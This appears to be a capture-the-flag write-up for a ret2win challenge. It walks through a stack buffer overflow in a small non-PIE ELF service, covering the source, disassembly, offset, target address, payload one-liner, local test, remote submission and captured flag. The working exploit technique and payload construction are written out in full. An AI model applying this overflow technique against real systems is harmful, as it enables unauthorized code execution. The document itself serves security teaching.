## 1. Challenge Overview

We are given:
- `service` — a 64-bit ELF executable
- `service.c` — the source code
- `client.py` — a helper to send a binary payload to the remote service
- `transport.txt` — notes about the environment

The description says:
> The night desk reads too much into a stack buffer. A forgotten function prints the sealed dispatch. NX is enabled, but the executable is not PIE. Source and ELF are included.

From `transport.txt`:
- Linux x86-64, static ELF
- NX on, no PIE, no stack canary
- One new process per POST `/run`
- Input limit 8192 bytes
- Execution limit 3 seconds

---

## 2. Source Code Analysis

`service.c` (abridged):

```c
void reward(void) {
    char b[160] = {0};
    const char *p = getenv("FLAG_PATH");
    FILE *f = fopen(p ? p : "/run/secrets/flag", "r");
    if (f) { fgets(b, sizeof(b), f); fclose(f); puts(b); }
}

void setup(void) {
    alarm(2); setbuf(stdout, NULL); setbuf(stdin, NULL);
}

__attribute__((naked,used)) void align_stack(void) { __asm__("ret"); }
__attribute__((used)) void forgotten(void) { reward(); _exit(0); }

__attribute__((noinline)) void desk(void) {
    char note[64]; puts("Your note?"); read(0, note, 256);
}

int main(void) { setup(); desk(); puts("Filed."); }
```

### Vulnerability
- `desk()` declares `char note[64]` and then calls `read(0, note, 256)`.
- `read` reads up to 256 bytes into a 64-byte buffer → **stack buffer overflow**.
- There is no stack canary (`transport.txt` confirms).

### Win Condition
- `forgotten()` calls `reward()` which reads the flag from `FLAG_PATH` (or `/run/secrets/flag`) and prints it.
- `forgotten()` is not called in the normal flow, but it exists in the binary and is even marked `used`.
- Since the binary is **non-PIE**, the address of `forgotten` is fixed and known.

---

## 3. Binary Protections

Using `checksec` (or manual inspection):
- **NX**: enabled (stack not executable)
- **PIE**: disabled (fixed addresses)
- **Canary**: disabled
- **RelRO**: not critical here

The binary is **statically linked**, so no libc base is needed. We only need to redirect execution to `forgotten`.

---

## 4. Finding the Offset

We need to know how many bytes to write before overwriting the saved return address.

Disassembly of `desk`:

```asm
000000000040194c <desk>:
  40194c:	55                   	push   rbp
  40194d:	48 89 e5             	mov    rbp,rsp
  401950:	48 83 ec 40          	sub    rsp,0x40          ; 64 bytes for note[]
  401954:	...                   ; puts("Your note?")
  401963:	48 8d 45 c0          	lea    rax,[rbp-0x40]    ; note at rbp-0x40
  401967:	ba 00 01 00 00       	mov    edx,0x100         ; 256 bytes
  40196c:	48 89 c6             	mov    rsi,rax
  40196f:	bf 00 00 00 00       	mov    edi,0x0
  401974:	e8 77 b8 01 00       	call   41d1f0 <__libc_read>
  401979:	90                   	nop
  40197a:	c9                   	leave
  40197b:	c3                   	ret
```

- `note` starts at `rbp-0x40` (64 bytes below RBP).
- The saved RBP is at `[rbp]` (8 bytes).
- The return address is at `[rbp+8]`.

So the distance from the start of `note` to the return address is:
`64 (buffer) + 8 (saved RBP) = 72 bytes`.

Therefore, **offset = 72 for the disassembled challenge build**. Buffer size alone does not establish a return-address offset for other builds.

---

## 5. Target Address

Find `forgotten` using `nm` or `objdump`:

```bash
nm service | grep forgotten
# 0000000000401939 T forgotten
```

Or from the disassembly:

```asm
0000000000401939 <forgotten>:
  401939:	55                   	push   rbp
  40193a:	48 89 e5             	mov    rbp,rsp
  40193d:	e8 83 fe ff ff       	call   4017c5 <reward>
  401942:	bf 00 00 00 00       	mov    edi,0x0
  401947:	e8 54 b7 00 00       	call   41d0a0 <_exit>
```

So `forgotten` is at **`0x401939`**.

---

## 6. Crafting the Payload

We need to send 72 bytes of padding followed by the 8-byte little-endian address of `forgotten`.

Python one-liner:

```python
import struct
payload = b'A' * 72 + struct.pack('<Q', 0x401939)
open('/tmp/payload.bin', 'wb').write(payload)
```

Or in a single command:

```bash
python3 -c "import struct; open('/tmp/payload.bin','wb').write(b'A'*72 + struct.pack('<Q', 0x401939))"
```

---

## 7. Local Testing

Make the binary executable and create a test flag file:

```bash
chmod +x service
echo "TESTFLAG{test}" > /tmp/flag.txt
```

Run the service locally with the payload:

```bash
FLAG_PATH=/tmp/flag.txt ./service < /tmp/payload.bin
```

Expected output:

```
Your note?
TESTFLAG{test}
```

This confirms the exploit works: we hijacked execution to `forgotten`, which called `reward` and printed the flag.

---

## 8. Remote Exploitation

The provided `client.py` sends a binary payload to the remote service:

```bash
python3 client.py https://challenges.tibeb.org/1a26b3e7-fa44-46f7-99c6-b338e928eef2 < /tmp/payload.bin
```

Output:

```
Your note?
tibeb{night_return_6ce4aa378821718178d4}
```

---

## 9. Flag

```
tibeb{night_return_6ce4aa378821718178d4}
```

---

## 10. Tricky Points & Notes

- **Offset calculation**: The shown disassembly places the buffer at `rbp-0x40` and the return address at `rbp+8`, giving 72 bytes for this build. Confirm the compiled frame layout before reusing the offset.
- **No PIE, no canary**: This makes the exploit trivial. In a real-world scenario, you'd need to leak addresses or bypass canaries.
- **Statically linked**: The binary is large, but we don't need any libc addresses because `forgotten` is self-contained and calls `reward` directly.
- **`align_stack` function**: This `ret` gadget changes RSP by 8 bytes and can adjust a chain’s alignment. The supplied notes record success with the direct 80-byte ret2win payload. That result does not prove ABI alignment; a different build or library path may require the extra gadget.
- **`read` vs `gets`**: `read` allows arbitrary bytes, including null bytes, so no problem embedding the address.
- **`alarm(2)`**: The process is killed after 2 seconds. Our exploit runs instantly, so no issue.
- **Remote input limit**: 8192 bytes, our payload is only 80 bytes.

This challenge is a classic ret2win with a stack buffer overflow, made easy by the lack of PIE and canary, and the presence of a convenient "forgotten" function that prints the flag.
